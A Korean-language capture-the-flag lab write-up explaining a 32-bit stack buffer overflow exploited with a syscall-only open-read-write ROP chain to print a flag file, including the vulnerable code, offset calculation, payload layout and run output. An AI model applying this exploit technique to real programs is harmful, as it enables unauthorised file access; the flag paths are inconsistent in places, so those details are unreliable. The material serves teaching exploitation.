# bof-rop-orw

## 1. 개요

이 실습은 **Stack Buffer Overflow**를 이용해
**syscall ROP 체인으로 flag 파일을 출력**하는 것을 목표로 한다.

* 쉘 획득 X
* libc 함수 호출 X
* syscall만 사용한 ORW(Open–Read–Write) ROP

즉, 이 실습에서는 syscall ABI를 활용한 ROP 체인을 통해
실제 리눅스 환경에서의 권한 문제와 파일 접근을 해결한다.

---

## 2. 실습 환경

* Architecture: x86 (32-bit)
* OS: Linux
* NX: Enabled
* PIE: Disabled
* ASLR: Enabled
* RELRO: Full
* Stack Canary: Disabled

---

## 3. 취약 코드

```c
char flag[] = "/tmp/bof-rop-row/flag";
char outbuf[40];

void vuln() {
    char buf[64];
    puts("input:");
    read(0, buf, 400);   // stack buffer overflow
}
```

#### 취약점 요약

* `read`에서 입력 크기 > buf 크기이므로 **BOF** 취약점 발생</br>
  → **saved RET overwrite 가능**

#### 참고

32bit의 바이너리에서는 가젯이 나오기 어려운 관계로,</br>
원활한 실습을 위해 필요한 가젯을 직접 넣어두었다.

``` c
__attribute__((naked))
void syscall_gadget() {
    __asm__ volatile(
        "int $0x80;\n"
        "ret;\n"
    );
}

__attribute__((noinline, used))
void ROP_bank(void) {
    __asm__ volatile(
        "pop %eax; ret;\n"
        "pop %ebx; ret;\n"
        "pop %ecx; ret;\n"
        "pop %edx; ret;\n"
        "mov %eax, %ebx; ret;\n"
    );
}
```

---

## 4. ROP(Return-Oriented Programming)

### 4.1 ROP란?

**ROP (Return-Oriented Programming)** 은
버퍼 오버플로우를 이용해 **프로그램의 return 흐름을 조작하여**,
이미 존재하는 코드 조각(gadget)을 연결해 원하는 동작을 수행하는 공격 기법이다.

NX가 활성화되어 쉘코드를 실행할 수 없을 때,
공격자는 새 코드를 실행하는 대신 기존 코드의 `ret`을 이용해
명령 조각들을 이어 붙여 프로그램의 흐름을 조작한다.


### 4.2 핵심 아이디어

ROP의 기본 구조는 다음과 같다:

```
[padding]
[gadget 주소]
[가젯에 필요한 값]
[다음 gadget 주소]
[다음 값]
...
```

`ret`의 실제 동작은 다음과 같다.

* `pop eip` : 스택의 최상단 값을 pop하여 eip에 저장
* `jmp eip` : eip 값으로 흐름 이동

즉, 스택에 있는 값을 다음 실행 주소로 사용한다. </br>
따라서 공격자는 스택에 gadget 주소들을 차례대로 배치해
코드를 조립하듯 실행 흐름을 구성할 수 있다.



### 4.3 이번 실습에서의 ROP

이번 과제에서는 ROP를 이용해:

1. `open`
2. `read`
3. `write`

세 개의 syscall을 순서대로 호출하여
flag 파일을 출력한다.

즉, 레지스터 세팅 → `int 0x80` 호출</br>
이 과정을 세 번 반복하는 것이 ROP 체인이다.


### 4.4 공격 전체 흐름 요약 

1. **BOF로 saved RET 덮기** → ROP chain 시작점으로 사용
2. `open(flag, O_RDONLY, 0)` : flag 파일 열기
3. `read(fd, outbuf, 40)` : flag 파일을 읽어 outbuf에 저장
4. `write(stdout, outbuf, 40)` : outbuf 내용을 출력

---

## 5. BOF offset 계산

BOF를 통해 `vuln()`의 saved RET를 ROP chain의 시작점으로 overwrite하여 control flow를 조작한다.


GDB vuln disassemble 결과: 
``` gdb
   0x080491f8 <+39>:	push   0x190
   0x080491fd <+44>:	lea    eax,[ebp-0x48]
   0x08049200 <+47>:	push   eax
   0x08049201 <+48>:	push   0x0
   0x08049203 <+50>:	call   0x8049040 <read@plt>
```

* buf 시작 주소 = ebp-0x48
* offset = (buf to saved EBP) = 0x48 + 0x4 = 0x4c

따라서 offset은 0x4c 이다.

페이로드 입력 후 스택 다이어그램: 
```
[높은주소]
+-----------------------+
|         ...           |
+-----------------------+
|       gadget2         |
+-----------------------+
|       gadget1         | vuln의 saved ret : ROP chain 시작점
+-----------------------+ [ebp+0x4]
|         AAAA          | vuln의 saved ebp
+-----------------------+ ← ebp
|          ...          |
+-----------------------+ 
|         AAAA          | buf
+-----------------------+ [ebp-0x48] 
[낮은주소]
```

ROP chain(gadget 연속)은 ORW syscall

---

## 6. syscall ROP

이 실습에서는 libc 함수(`system`, `open`, `read`, `write` 등)를 사용하지 않고
**리눅스 커널 syscall을 직접 호출하는 ROP 체인**을 구성한다.

이는 다음과 같은 환경적 제약 때문이다.

* NX enabled → 쉘코드 주입 불가
* Full RELRO → GOT overwrite 불가
* ASLR on → libc 주소가 매번 변경됨
* **syscall은 커널 ABI이므로 libc 상태와 무관**

따라서 `int 0x80`을 이용한 **syscall-only ROP**가 가장 안정적인 공격 방식이 된다.

> **노트 ── System Call**
>
> 유저 프로그램이 커널 모드에서만 가능한 기능을 안전하게 사용할 수 있도록 도와주는 인터페이스

### 6.1 x86 (32-bit) Linux syscall 규약

x86 32-bit 리눅스에서 `int 0x80`을 사용할 경우,
syscall 번호와 인자는 **레지스터**로 전달된다.

> **노트 ── 어셈블리에서의 int**
>
> 어셈블리어에서의 `int`는 interrupt를 발생시키는 명령어이다.
>
> 리눅스의 syscall은 0x80번으로 설정되어 있어, `int 0x80`을 사용 시 syscall이 발생한다.

### 6.2 기본 규약

| 레지스터       | 의미         |
| ---------- | ---------- |
| `eax`      | syscall 번호 |
| `ebx`      | 1번째 인자     |
| `ecx`      | 2번째 인자     |
| `edx`      | 3번째 인자     |
| `int 0x80` | syscall 실행 |

syscall의 리턴값은 `eax`에 저장된다.

### 6.3 사용한 syscall 번호

본 실습에서 사용한 syscall 번호는 다음과 같다
(Linux x86 32-bit 기준).

| syscall    | 번호 |
| ---------- | -- |
| `open`     | 5  |
| `read`     | 3  |
| `write`    | 4  |

> **노트**
> syscall 번호는 아키텍처 및 ABI에 따라 다르며,
> x86_64 환경에서는 전혀 다른 번호와 호출 방식(`syscall`)을 사용한다.

---

## 7. ORW(Open–Read–Write) syscall 흐름

### 7.1 open

```c
fd = open("/tmp/bof-rop-pivot/flag", O_RDONLY, 0);
```

```asm
eax = 5
ebx = &flag("/tmp/bop-rop-orw/flag")
ecx = 0
edx = 0
int 0x80
# eax = fd
```

### 7.2 read

```c
read(fd, outbuf, 40);
```

```asm
eax = 3
ebx = fd
ecx = &outbuf
edx = 40
int 0x80
```

이 syscall 이후, **flag 내용은 outbuf에 저장된다.**


### 7.3 write

```c
write(1, outbuf, 40);
```

```asm
eax = 4
ebx = 1        # stdout
ecx = &outbuf
edx = 40
int 0x80
```

이 syscall을 통해 BUF에 저장된 flag 내용이 화면에 출력된다.

---

## 8. 전체 페이로드 구조

```
[bof offset] //offset from buf to saved ebp

//open(flag, 0, 0)
[pop eax] [5(open)]
[pop ebx] [&flag]
[pop ecx] [0]
[pop edx] [0]
[syscall]

//read(fd, outbuf, 40)
[mov ebx eax] //fd
[pop eax] [3(read)]
[pop ecx] [&outbuf]
[pop edx] [40]
[syscall]

//write(1, outbuf, 0x40)
[pop eax] [4(write)]
[pop ebx] [1]
[pop ecx] [&outbuf]
[pop edx] [40]
[syscall]
```

---

## 9. 익스플로잇 결과

```bash
$ (python3 payload.py) | ./vuln
input:
flag{cat_said_orw_ROP^._.^}
Segmentation fault
```

* flag 출력 성공
* 이후 ROP 체인 종료로 인한 segfault는 정상적인 동작


flag 출력 화면:
![flag](https://github.com/sage-502/pwnable-lab/blob/main/images/bof-rop-orw/00.png)


> **노트 ── gdb에서 syscall이 정상 동작하지 않는 이유**
> 
> gdb로 바이너리를 실행할 경우,
> 디버거의 보안 정책에 의해 **setuid/setgid 비트가 무시**된다.
> 
> 따라서:
> 
> * gdb 안에서는 `getegid()`가 일반 사용자 그룹 ID를 반환
> * 실제 exploit 결과(권한 상승, flag 출력)는 gdb 밖에서만 확인 가능
> 
> 이는 정상적인 동작이며, exploit이 실패한 것이 아니다.
